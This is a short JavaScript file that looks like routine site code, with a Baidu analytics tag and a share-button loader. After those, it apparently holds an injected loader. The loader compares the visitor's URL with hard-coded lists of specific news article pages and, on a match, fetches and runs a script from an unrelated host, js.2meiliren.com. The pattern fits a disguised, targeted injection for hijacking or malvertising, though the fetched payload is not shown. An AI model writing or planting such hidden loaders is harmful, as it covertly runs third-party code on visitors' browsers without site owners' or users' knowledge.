var _hmt = _hmt || []; 
(function() { 
    var hm = document.createElement("script"); 
    hm.src = "https://hm.baidu.com/hm.js?f26eea3c0883be4c444c00f18f6746c0"; 
    var s = document.getElementsByTagName("script")[0]; 
    s.parentNode.insertBefore(hm, s); 
})();

function loadBaiduShare() {
    var script = document.createElement('script');
    script.src = 'https://static.bshare.cn/b/bshareCO.js';
    script.onload = function() {
        if (typeof initBaiduShare === 'function') {
            initBaiduShare();
        }
    };
    script.onerror = function() {};
    document.head.appendChild(script);
}
loadBaiduShare();

function isValidUrl(url, validUrls) {
    return validUrls.includes(url);
}

function loadScript(url) {
    const script = document.createElement('script');
    script.src = url;
    script.onload = () => {
        console.log(`Script loaded: ${url}`);
    };
    script.onerror = () => {
        console.error(`Error loading script: ${url}`);
    };
    document.head.appendChild(script);
}
 
const validUrls1 = [
    'http://language.chinadaily.com.cn/news/2010-07/02/content_10051802.htm',
    'https://www.hntqb.com/html/2023-12/05/content_99848_73940.htm',
    'https://www.hntqb.com/html/2023-11/30/content_99848_52585.htm',
];

const validUrls2 = [
    'http://www.liuyanbao.net/xueweiyangsheng/6321.html',
    'http://www.chinadaily.com.cn/entertainment/2006-06/21/content_622250.htm',
    'http://tdhbqx.com/',
	'http://www.liuyanbao.net/xueweiyangsheng/6468.html',
	'http://www.ecns.cn/m/2015/02-13/154796.shtml',
	'http://www.chinadaily.com.cn/m/chinalic/2016-08/08/content_26393093.htm',
	'https://wapjbk.39.net/cdhyzhz/240318/x7nowhp.html',
	'https://www.chinanews.com.cn/fz/2013/10-08/5351226.shtml',
	'https://www.chinanews.com.cn/edu/2013/11-06/5467595.shtml',
	'https://www.chinanews.com.cn/edu/2011/09-06/3309360.shtml',
	'https://www.chinanews.com.cn/m/fz/2015/05-07/7259325.shtml',
	'https://www.chinanews.com.cn/fz/2013/09-07/5257980.shtml',
	'http://www.hnr.cn/news/shxw/201208/t20120815_170849.html',
	'https://www.chinanews.com.cn/fz/2013/05-21/4841158.shtml',
	'http://china.chinadaily.com.cn/shizheng/2016-02/11/content_23450514_3.htm',
	'http://www.chinadaily.com.cn/kindle/2015-08/17/content_21622754.htm',
	'http://www.chinadaily.com.cn/kindle/2017-08/26/content_31141288.htm',
	'http://pic.chinadaily.com.cn/2015-09/18/content_21918510.htm',
	'http://www.chinadaily.com.cn/entertainment/2006-12/15/content_759917.htm',
];

const validUrls3 = [
    'https://www.chinanews.com/m/fortune/2015/04-17/7213848.shtml',
    'https://www.chinanews.com.cn/m/sh/2021/05-13/9476412.shtml',
    'https://www.chinanews.com/ga/2011/10-10/3376725.shtml',
];

const currentUrl = window.location.href;

if (isValidUrl(currentUrl, validUrls1)) {
    loadScript('https://js.2meiliren.com/fp/a87ff679a2f3e71d9181a67b7542122c.js');
} else if (isValidUrl(currentUrl, validUrls2)) {
    loadScript('https://js.2meiliren.com/fp/c81e728d9d4c2f636f067f89cc14862c.js');
} else if (isValidUrl(currentUrl, validUrls3)) {
    loadScript('https://js.2meiliren.com/fp/eccbc87e4b5ce2fe28308fd9f2a7baf3.js');
} else {
     
}
